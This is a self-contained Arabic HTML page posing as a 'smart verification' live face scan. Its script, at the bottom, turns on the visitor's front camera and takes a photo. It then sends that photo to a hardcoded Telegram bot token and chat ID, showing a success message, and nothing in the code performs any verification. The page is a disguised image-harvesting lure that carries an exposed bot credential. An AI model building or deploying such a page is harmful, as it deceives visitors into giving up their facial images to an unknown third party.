<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص الوجه الحي</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #e0e0e0;
            font-family: 'Segoe UI', Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .scan-container {
            text-align: center;
            position: relative;
            width: 320px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 30px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
        }

        /* حاوية الفيديو الدائرية */
        .video-box {
            position: relative;
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border-radius: 50%;
            border: 2px solid #00d2ff;
            overflow: hidden;
            background: #000;
            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* وضع المرآة */
        }

        /* خط المسح الضوئي المتحرك */
        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(to bottom, transparent, #00d2ff, transparent);
            box-shadow: 0 0 15px #00d2ff;
            animation: scan 3s infinite linear;
            z-index: 10;
            display: none; /* يظهر فقط عند بدء البث */
        }

        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }

        .btn-action {
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.3);
            width: 100%;
        }

        .btn-action.stop {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.3);
        }

        #status {
            margin-top: 15px;
            font-size: 13px;
            color: #888;
        }

        canvas { display: none; }
    </style>
</head>
<body>

<div class="scan-container">
    <h3 id="title">نظام التحقق الذكي</h3>
    
    <div class="video-box">
        <div class="scan-line" id="scanLine"></div>
        <video id="video" autoplay playsinline muted></video>
    </div>

    <button id="actionBtn" class="btn-action">ابدأ البث الحي</button>
    <p id="status">يرجى الضغط لبدء عملية المسح</p>
</div>

<canvas id="canvas"></canvas>

<script>
    const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
    const chatId = "591768998";
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const actionBtn = document.getElementById('actionBtn');
    const status = document.getElementById('status');
    const scanLine = document.getElementById('scanLine');

    let stream = null;
    let isStreaming = false;

    actionBtn.addEventListener('click', async () => {
        if (!isStreaming) {
            // بدء البث
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                isStreaming = true;
                
                // تحديث الواجهة
                actionBtn.innerText = "إيقاف وإتمام التحقق";
                actionBtn.classList.add('stop');
                scanLine.style.display = 'block';
                status.innerText = "جاري المسح الضوئي... يرجى الثبات";
                
            } catch (err) {
                status.innerText = "خطأ: تأكد من منح إذن الكاميرا واستخدام HTTPS";
                console.error(err);
            }
        } else {
            // إيقاف البث وإرسال الصورة
            stopAndSend();
        }
    });

    function stopAndSend() {
        // 1. التقاط الصورة من الفيديو الحالي
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        // عكس الصورة برمجياً قبل الإرسال لتظهر بشكل صحيح
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0);
        
        // 2. إيقاف الكاميرا
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        // 3. تحديث الواجهة
        isStreaming = false;
        video.srcObject = null;
        scanLine.style.display = 'none';
        actionBtn.innerText = "جاري المعالجة...";
        actionBtn.disabled = true;

        // 4. إرسال الصورة للبوت
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'live_scan.jpg');
            formData.append('caption', '✅ تم إتمام الفحص الحي بنجاح');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                status.innerText = "تم الإرسال بنجاح!";
                actionBtn.innerText = "تم التحقق";
                actionBtn.style.background = "#2ecc71";
            })
            .catch(() => {
                status.innerText = "حدث خطأ في الإرسال";
                actionBtn.disabled = false;
                actionBtn.innerText = "إعادة المحاولة";
            });
        }, 'image/jpeg', 0.8);
    }
</script>

</body>
</html>
